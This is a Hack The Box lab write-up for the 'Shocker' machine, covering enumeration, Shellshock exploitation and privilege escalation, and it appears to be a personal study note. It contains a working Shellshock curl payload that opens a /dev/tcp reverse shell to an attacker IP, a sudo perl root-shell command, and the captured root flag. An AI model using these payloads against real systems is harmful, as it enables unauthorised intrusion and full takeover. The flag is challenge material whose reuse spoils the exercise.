## Information

| Property     | Value                       |
|--------------|-----------------------------|
| **Name**     |  Shocker |
| **IP Address**| 10.10.10.56        |
| **OS**       |   Linux      |
| **Difficulty**| Easy   |

## Enumeration
### Nmap Scan
```bash
nmap -sC -sV -oN nmap_scan.txt -Pn 
```

```
80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


## Initial Access
### Port [80] - [Web Server]

Fuzzing directories using Ffuf revealed the presence of the cgi-bin folder.
#### FFUF Alias for web content discovery: 

```bash
alias ffuf_web_medium='_ffuf_web_medium() { ffuf -w ~/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -c -s -u http://$1/FUZZ/; }; _ffuf_web_medium'
```

For the content of the cgi-bin direcotory, using the same wordlists with multiple extensions like .sh or .cgi, this will reveal the user.sh script. 

#### Vulnerability Exploited

Shellshock vulnerability affecting the cgi-bin exploited by sending a crafted user-agent header: 
```bash
curl -H "user-agent: () { :; }; echo; /bin/sh -i >& /dev/tcp/10.10.14.5/1337 0>&1" http://shocker.htb/cgi-bin/user.sh
```
#### Exploitation Steps

Setting up a listener using [pwncat-cs](https://github.com/calebstewart/pwncat) and sending the malicious request gives us a shell back. 

```bash
[09:34:09] Welcome to pwncat 🐈!                         __main__.py:164
[09:43:50] received connection from 10.10.10.56:51198                         bind.py:84
[09:43:51] 0.0.0.0:1337: upgrading from /bin/dash to /bin/bash            manager.py:957
[09:43:52] 10.10.10.56:51198: registered new host w/ db                   manager.py:957
(local) pwncat$ back
(remote) shelly@Shocker:/usr/lib/cgi-bin$ id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
(remote) shelly@Shocker:/usr/lib/cgi-bin$ 
```

### User Access

Content of user.sh: 

```bash
(remote) shelly@Shocker:/usr/lib/cgi-bin$ cat user.sh
#!/bin/bash
echo
echo "Content-Type: text/plain"
echo ""
echo "Just an uptime test script"
echo
uptime
echo
echo
(remote) shelly@Shocker:/usr/lib/cgi-bin$ 
```

#### User Flag

- 
## Privilege Escalation

User ``shocker``  is able to run perl with sudo: 

```sh
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

Executing perl as root using the following gtfo command: 

```bash
sudo perl -e 'exec "/bin/sh";'
```

#### Root Flag

49eb3457c5f0411a37a9f907db03d92d
## Conclusion


## Additional Notes

0xdf talked about why the trailing slash is needed when requesting the /cgi-bin directory:

From: https://0xdf.gitlab.io/2021/05/25/htb-shocker.html#shellshock-chained-commands

The mystery unlocked when I started looking at the other Apache config files, specifically `/etc/apache2/conf-enabled/serve-cgi-bin.conf`:

```
<IfModule mod_alias.c>
        <IfModule mod_cgi.c>
                Define ENABLE_USR_LIB_CGI_BIN
        </IfModule>

        <IfModule mod_cgid.c>
                Define ENABLE_USR_LIB_CGI_BIN
        </IfModule>

        <IfDefine ENABLE_USR_LIB_CGI_BIN>
                ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
                <Directory "/usr/lib/cgi-bin">
                        AllowOverride None
                        Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
                        Require all granted
                </Directory>
        </IfDefine>
</IfModule>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```

The line `ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/` will match on requests to `/cgi-bin/` and alias them into the `/usr/lib/cgi-bin/` directory. But it only matches if there’s a trailing slash!

To test this, I removed the trailing slash, leaving:

```
ScriptAlias /cgi-bin /usr/lib/cgi-bin/
```

## Resources
https://0xdf.gitlab.io/2021/05/25/htb-shocker.html#shellshock-chained-commands
